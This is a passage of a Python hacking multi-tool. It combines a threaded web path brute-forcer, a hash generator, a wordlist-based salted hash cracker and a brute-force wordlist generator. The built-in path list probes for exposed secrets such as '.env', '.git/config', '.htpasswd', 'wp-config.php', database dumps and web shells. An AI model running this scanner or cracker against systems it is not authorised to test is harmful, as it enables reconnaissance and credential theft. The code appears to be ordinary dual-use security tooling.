⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠈⣿⣿⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⠎⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣋⡉⠉⠛⠉⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⣿⣿⣿⣿⠟⠉⢼⣿⣿⣦⣆⢀⣠⣴⣦⣤⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠙⠛⠿⠿⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"""
	c.print(sub_md, style="regular")
	c.print(f"[regular]{sub_art}")

HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/124.0.0.0 Safari/537.36"),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive",
}

thread_local = threading.local()

subdomains = [
    "admin", "administrator", "admin/login", "admin-panel", "admincp",
    "login", "signin", "signup", "logout", "auth", "dashboard",

    "robots.txt", "sitemap.xml", "humans.txt",

    ".git/", ".git/config", ".env", ".htaccess", ".htpasswd",
    ".DS_Store",

    "config", "configs", "configuration", "settings", "setup",
    "config.php", "wp-config.php",

    "backup", "backups", "backup.zip", "backup.tar.gz",
    "db.sql", "database.sql", "dump.sql",

    "uploads", "upload", "files", "file", "media",
    "private", "tmp", "temp",

    "test", "testing", "dev", "development", "staging",
    "old", "beta", "alpha",

    "api", "api/v1", "api/v2", "api/test",
    "swagger", "swagger-ui", "openapi.json",

    "phpinfo.php", "info.php", "server-status",
    "status", "health", "monitor",

    "logs", "log", "error.log", "access.log",

    "shell.php", "cmd.php", "console", "terminal",

    "index.php~", "config.php~", ".bak", ".old", ".swp",

    "user", "users", "account", "profile",

    "reset", "forgot-password", "password/reset"
]


def get_inputs():
    global choice
    sub_art()
    url = c.input("[regular]Enter The URL:\t").strip()
    clear_screen()
    sub_art()
    choice = c.input("[regular]Choose:\n[ [info]1[regular] ] Use Your Own Wordlist\n[ [info]2[regular] ] Use Tool's Wordlist\n Answer:	")
    clear_screen()
    sub_art()
    file = ""
    if choice == "1":
    	file = c.input("[regular]Enter The Wordlist File Path:\t").strip()
    	if not ".txt" in file:
    		file = glob.glob(f"{file}.txt")
    		for i in file:
    			file = i
    elif choice == "2":
    	pass
    	
    clear_screen()
    return url, file


def get_session():
    if not hasattr(thread_local, "session"):
        s = requests.Session()
        s.headers.update(HEADERS)
        thread_local.session = s
    return thread_local.session


def load_words(file_path):
	with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
	   	   	return [w.strip() for line in f for w in line.split() if w.strip()]
    	   	


def check_word(word, base):
    word = word.lstrip("/")
    new_url = f"{base}/{word}"
    session = get_session()
    try:
        resp = session.get(new_url, timeout=TIMEOUT, allow_redirects=False)
        code = resp.status_code
        if 200 <= code < 300:
            return ("Success", code, new_url)
        elif 300 <= code < 400:
            return ("Redirect", code, new_url, resp.headers.get("Location", ""))
        else:
            return None
    except requests.exceptions.RequestException:
        return None


def run_scanner(words, base):
    start = time.time()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
        futures = [exe.submit(check_word, w, base) for w in words]
        try:
            for future in as_completed(futures):
                res = future.result()
                if not res:
                    continue

                if res[0] == "Success":
                    _, code, url = res
                    c.print(f"[regular][200+] [Found] {code} -> [bold magenta]{url}")

                elif res[0] == "Redirect":
                    _, code, url, loc = res
                    c.print(f"[bold yellow][3xx] [Redirect] {code} -> [bold magenta]{url} (Location: {loc})")

                if DELAY_BETWEEN_REQUESTS:
                    time.sleep(DELAY_BETWEEN_REQUESTS)

        except KeyboardInterrupt:
            c.print("\n[error]Interrupted by user — shutting down...")

    end = time.time()
    c.print(f"\n[info]Finished in {end - start:.2f} seconds.")
    c.input("[info]\nPress Enter To Continue")


def sub_runner():
    url, file_path = get_inputs()
    base = url.rstrip('/')

    if choice == "1":
        words = load_words(file_path)
    elif choice == "2":
        words = subdomains

    c.print(f"[info]Loaded {len(words)} words — starting with {MAX_WORKERS} workers...\n")
    run_scanner(words, base)
    clear_screen()
    sub_art()

    if not ask_again():
        return

#_________________________________________



#________________Hasher_________________

def hasher_runner():

    art = r"""
 _   _    _    ____  _   _ _____ ____
| | | |  / \  / ___|| | | | ____|  _ \
| |_| | / _ \ \___ \| |_| |  _| | |_) |
|  _  |/ ___ \ ___) |  _  | |___|  _ <
|_| |_/_/   \_\____/|_| |_|_____|_| \_\

            ,     \    /      ,        
           / \    )\__/(     / \      
          /   \  (_\  /_)   /   \      
     ____/_____\__\@  @/___/_____\____ 
    |             |\../|              |
    |              \VV/               |
    |           H A S H E R           |
    |_________________________________|
    |    /\ /      \\       \ /\    | 
    |   /  V       ))        V   \  | 
    |/     `       //        '    \ |
     `             V                ' 
"""

    def generate_hash():
        clear_screen()
        c.print(f"[bold green]{art}")
        text = c.input("[bold green]Enter The Text:\t")

        clear_screen()
        c.print(f"[bold green]{art}")
        salt = c.input("[bold green]Enter The Salt ( Press Enter If No Salt ): ")

        clear_screen()
        c.print(f"[bold green]{art}")
        order = c.input("[bold green]Enter ( salt ) if salt first or ( hash ) if hash first: ")

        data = (salt + text) if order.lower() == "salt" else (text + salt)

        clear_screen()
        c.print(f"[bold green]{art}")
        choice = c.input("[bold green]Choose Hash Type:\n[ [info]1[regular] ] MD5\n[ [info]2[regular] ] SHA256\n[ [info]3[regular] ] SHA512\n[ [info]4[regular] ] SHA1\n[ [info]5[regular] ] SHA3_512\nAnswer:	")

        hashes = {
            "1": hashlib.md5,
            "2": hashlib.sha256,
            "3": hashlib.sha512,
            "4": hashlib.sha1,
            "5": hashlib.sha3_512
        }

        if choice in hashes:
            hashed = hashes[choice](data.encode()).hexdigest()
            clear_screen()
            c.print(f"[bold green]{art}")
            c.print(f"[bold green]The Hash:\t[/][bold cyan]{hashed}")
        else:
            c.print("[bold red]Invalid Choice")

        c.input("\nPress Enter To Continue...")

    def compare_hash():
        found = None
        clear_screen()
        c.print(f"[bold green]{art}")
        text = c.input("[bold green]Write The Text:\t")

        clear_screen()
        c.print(f"[bold green]{art}")
        target_hash = c.input("[bold green]Enter The Hash:\t")

        clear_screen()
        c.print(f"[bold green]{art}")
        salt = c.input("[bold green]Enter The Salt ( Press Enter If No Salt ): ")

        clear_screen()
        c.print(f"[bold green]{art}")
        order = c.input("[bold green]Enter ( salt ) if salt first or ( hash ) if hash first: ")

        data = (salt + text) if order.lower() == "salt" else (text + salt)

        hash_map = {
            "MD5": hashlib.md5,
            "SHA1": hashlib.sha1,
            "SHA256": hashlib.sha256,
            "SHA512": hashlib.sha512,
            "SHA3_512": hashlib.sha3_512
        }

        clear_screen()
        c.print(f"[bold green]{art}")

        for name, func in hash_map.items():
            result = func(data.encode()).hexdigest()
            if result == target_hash:
                c.print(f"[bold green]{name}: True")
                found = name
            else:
                c.print(f"[bold red]{name}: False")
            time.sleep(0.3)

        if found:
            c.print(f"\n[bold green]Hash Type Found:[/] [bold cyan]{found}")
        else:
            c.print("\n[bold red]No Matching Hash Type")

        c.input("\nPress Enter To Continue...")

    while True:
        clear_screen()
        c.print(f"[bold green]{art}")
        choice = c.input("[regular]What Do You Want To Do?\n[ [info]1[regular] ] Generate Hash\n[ [info]2[regular] ] Hash Comparison\n[ [info]3[regular] ] Exit\nAnswer:	")

        if choice == "1":
            generate_hash()
        elif choice == "2":
            compare_hash()
        elif choice == "3":
            break
        else:
            c.print("[error][ + ] Invaild Choice...")
            break
            
#________________________________________



jtr_md = Markdown("# Jack The Reaper...")
sub_jtr_md = Markdown("# The Reaper Killed Your Hash..")
#_______________JTR_____________________
def jtr_art():
    art = """			████▀░░░░░░░░░░░░░░░░░▀████
			███│░░░░░░░░░░░░░░░░░░░│███
			██▌│░░░░░░░░░░░░░░░░░░░│▐██
			██░└┐░░░░░░░░░░░░░░░░░┌┘░██
			██░░└┐░░░░░░░░░░░░░░░┌┘░░██
			██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
			██▌░│██████▌░░░▐██████│░▐██
			███░│▐███▀▀░░▄░░▀▀███▌│░███
			██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
			██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
			████▄─┘██▌░░░░░░░▐██└─▄████
			█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
			████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
			█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
			███████▄░░░░░░░░░░░▄███████ \n"""
    clear_screen()
    c.print(jtr_md, style="regular")
    c.print(f"[regular]{art}")
    
def sub_jtr_art():
	clear_screen()
	c.print(sub_jtr_md, style="info")
    
def like(part):
    return all(c in "0123456789abcdef" for c in part.lower()) and len(part) in (32, 40, 64, 128)

def kill_hash(names, salt, h):
    le = len(h)
    start = time.perf_counter()
    c.print("[info] Please Wait... Jack The Reaper...")
    b = 0
    for name in names:
        for v in (name + salt, salt + name):
            b += 1
            if le == 32:
                n = hashlib.md5(v.encode()).hexdigest()
                if n == h:
                    t = round(time.perf_counter() - start, 2)
                    speed = round(b / t, 1)
                    return name, "md5", t, speed
            elif le == 40:
                n = hashlib.sha1(v.encode()).hexdigest()
                if n == h:
                    t = round(time.perf_counter() - start, 2)
                    speed = round(b / t, 1)
                    return name, "sha1", t, speed
            elif le == 64:
                n = hashlib.sha256(v.encode()).hexdigest()
                if n == h:
                    t = round(time.perf_counter() - start, 2)
                    speed = round(b / t, 1)
                    return name, "sha256", t, speed
                n = hashlib.sha3_256(v.encode()).hexdigest()
                if n == h:
                    t = round(time.perf_counter() - start, 2)
                    speed = round(b / t, 1)
                    return name, "sha3_256", t, speed
            elif le == 128:
                n = hashlib.sha512(v.encode()).hexdigest()
                if n == h:
                    t = round(time.perf_counter() - start, 2)
                    speed = round(b / t, 1)
                    return name, "sha512", t, speed
                n = hashlib.sha3_512(v.encode()).hexdigest()
                if n == h:
                    t = round(time.perf_counter() - start, 2)
                    speed = round(b / t, 1)
                    return name, "sha3_512", t, speed
    return None, None, None, None

def run_hash_killer():
    global fp
    jtr_art()
    raw = c.input("[regular]Enter The Hash:\t")
    salt = c.input("\n[regular]Enter The Salt( Press Enter Of No Salt ): ")
    h = raw
    if "$" in raw:
        a, b = raw.split("$", 1)
        if like(b):
            salt, h = a, b
        elif like(a):
            h, salt = b, a
    fp = c.input("\n[regular]Enter Wordlist Filepath:\t")
    if ".zip" in fp:
        with zipfile.ZipFile(fp, "r") as zip:
            for name in zip.namelist():
            	zip.extract(name, os.path.dirname(fp))
            	if os.path.isfile(name):
            		fp = os.path.join(os.path.dirname(fp), name)
            		dirname = os.path.dirname(fp)
        	   	
 
    with open(fp, "r", encoding="utf-8", errors="ignore") as f:
        names = f.read().splitlines()
    clear_screen()
    result, hash_type, t, speed = kill_hash(names, salt, h)
    if result:
        sub_jtr_art()
        c.print(f"[info]\nFound!\nHash Original Text:\t[/][bold magenta]{result}")
        c.print(f"[info]Hash Type:\t[/][bold magenta]{hash_type}")
        c.print(f"[info]Hash Killed in [bold magenta]{t}s")
        c.print(f"[info]Hashing Speed:\t[/][bold magenta]{speed}/s")
    else:
        
        c.print("[error] The Tool Couldn't Kill The Hash..")

def jtr_main():
    t = threading.Thread(target=run_hash_killer)
    t.start()
    t.join()
    try:
    	shutil.rmtree(dirname)
    except Exception:
    	pass
    
#______________________________________

#____________spider-list_V2____________

def spider_art():
    spider_md = Markdown("# Welcome To The Spider-List Version-2..")
    art_text = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠲⢶⣶⠒⠒⠿⣶⠒⠚⢿⡒⠛⣻⣿⣿⣿⡛⠛⢻⡟⠛⣻⠟⢻⣿⡿⣿⠉⠉⠛⢿⡛⠛⢻⡟⠛⢿⣿⣿⣿⣿⣹⡿⠋⣿⠟⠛⣻⠟⢻⡿⠛⠿⣿⠻⢿⡛⢿⡛⢿⣿⣿⣿⣿⣿⣿⠟⠛⣿⠟⣻⠟⢛⣿⠿⠷⢸
⠀⠀⠹⣧⠀⠀⢹⡆⠀⢸⣧⡾⣻⣿⣧⠀⠙⣳⣾⡀⢰⠏⢠⡿⢸⠀⠘⢷⡀⠀⠀⢿⡀⠀⢻⣴⠟⣿⣽⣽⣿⠟⢷⣤⡇⠀⢠⡏⢠⡟⠀⠀⠀⠈⣇⠈⣧⢈⣷⣟⢻⣾⣹⣿⣼⠿⣦⣼⠃⣰⠏⢀⡾⠁⠀⠀⢸
⠀⠀⠀⠘⣧⠀⠀⣿⢠⡾⠛⣷⣏⣿⠹⣤⡾⠉⣩⡿⠿⣦⣿⠁⢸⠀⠀⠈⣧⠀⠀⢸⣧⡶⠛⢿⣼⠁⢹⠁⠈⣷⣠⡟⠛⢶⣼⡇⣾⠀⠀⠀⠀⠀⢸⣠⡿⢿⣄⢻⣾⡋⢻⠏⢿⣴⠟⢻⣶⡏⠀⡼⠁⠀⠀⠀⢸
⠀⠀⠀⠀⢸⡄⢀⡿⠛⠳⣦⡟⠙⣿⠖⣿⠀⡼⠋⠀⣠⡾⠛⠓⢸⠀⠀⠀⢸⣆⣠⡾⠻⣦⡀⣸⠟⠳⣾⡶⠛⠙⢻⡄⢀⡿⠉⣻⣿⡄⠀⠀⠀⠀⠞⠛⢷⣄⢹⣶⡟⠛⢿⡾⠛⢿⣠⡟⠉⢻⣶⡇⠀⠀⠀⠀⢸
⠀⠀⠀⠀⣸⡿⠛⢶⣄⠀⣿⠷⢦⣿⣤⢾⣿⠃⠀⣼⠏⠀⠀⠀⢸⠀⠀⠀⣠⠿⣧⣀⠀⠈⢿⡏⠀⠀⢻⠀⠀⣀⣀⣿⣼⢃⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣆⣿⠛⠳⣾⣀⣤⠾⢿⣀⣴⠟⠉⠛⠀⠀⠀⠀⢸
⠀⠀⠀⠘⠃⠀⠀⠀⢹⣾⠇⠀⠀⣿⠁⠀⢻⣄⣾⠃⠀⠀⠀⠀⢸⠀⠀⠈⠁⠀⠀⠻⣦⢀⡾⠻⠶⣤⣸⣴⠞⠋⠁⠈⢻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⠷⢶⣄⣸⠏⣠⣴⠾⣿⠁⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠟⠛⠻⣿⣴⠾⠿⣿⠃⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠘⣿⣃⣀⠀⠈⢹⠃⢀⣤⠾⠛⠛⠛⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠙⢾⡻⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀⣿⠀⠀⠀⠘⠂⠀⠀⠀⢸⠀⢸⠀⡇⠀⠀⠀⠀⠀⠰⠏⠀⠉⠙⢷⣼⣶⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⡀⠀⢸⡀⢸⠀⡇⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡤⠤⢽⣿⡿⢥⣜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠑⡯⠻⢻⠑⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
"""
    c.print(spider_md, style="regular")
    c.print(f"[regular]{art_text}")

def dec():
    clear_screen()
    spider_art()

def do():
    dic = []
    dec()
    length = int(c.input("[regular]Enter The Length: "))
    dec()
    c.print("[regular]The Chars List:\nNumber = [info]num\n[regular]Lowercase letter = [info]lower\n[regular]Uppercase letter = [info]upper\n[regular]Both Letters = [info]letter\n[regular]Symbol =[info] symbol\n\nOr EX Of What You Want\n[bold magenta]ex. [regular]9 = [info]number\n\n[bold yellow][ + ] Symbols And  Mix Letters Need To Be Wroten As \"symbol\" and \"letter\"\n[bold yellow][ + ] letter = The Two Types, Be Careful When You Use It\n\n")
    for i in range(length):
        choose = c.input(f"[regular]The {i+1} Char Will Be:    ")
        
        pattern1 = r"[0-9]+"
        pattern2 = r"[a-z]+"
        pattern3 = r"[A-Z]+"
        pattern4 = r"[A-Za-z]+"
        pattern5 = r"[a-zA-Z]+"
        
        if re.search(pattern1, choose):
        	dic.append(string.digits)
        	
        elif re.search(pattern2, choose):
        	dic.append(string.ascii_lowercase)
        	
        elif re.search(pattern3, choose):
        	dic.append(string.ascii_uppercase)
        
        elif re.search(pattern4, choose):
        	dic.append(string.ascii_letters)
        	
        elif re.search(pattern5, choose):
        	dic.append(string.ascii_letters)

        if choose.lower() == "num":
            dic.append(string.digits)
            
        elif choose.lower() == "lower":
            dic.append(string.ascii_lowercase)
            
        elif choose.lower() == "upper":
            dic.append(string.ascii_uppercase)
            
        elif choose.lower() == "letter":
            dic.append(string.ascii_letters)
            
        elif choose.lower() == "symbol":
            dic.append(string.punctuation)
            
    dec()
    
    filename = c.input("[regular]Enter Wordlist's Filename: ")
    
    if ".txt" not in filename:
    	filename = glob.glob(f"{filename}.txt")
    	for i in filename:
    		filename = i
    
    
    dec()
    
    c.print("[info][ + ][regular] Generating Spider-list..")
    
    with open(filename, "w") as f:
        for word in itertools.product(*dic):
            f.write("".join(word) + "\n")
    dec()
            
    choicer = c.input("[regular]\n[info][ + ][regular] Want It In A Zipfile?[ [info]Y - N[regular] ]:	")

    if choicer.lower() == "y":
    	zipname = c.input("[regular][info][ + ][regular] Enter The ZipFile Name:	")
    	with zipfile.ZipFile(zipname, "w", compression=zipfile.ZIP_DEFLATED) as zip:
    		zip.write(filename)
    		
    	with open(filename, "w") as f:
    		f.write("")
    	os.remove(filename)
    	
    else:
    	pass
    	
    c.print("[info][ + ][regular] Wordlist Generated..")
    dic = []
    
    
#_______________________________________

def main_art():
	main_art = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
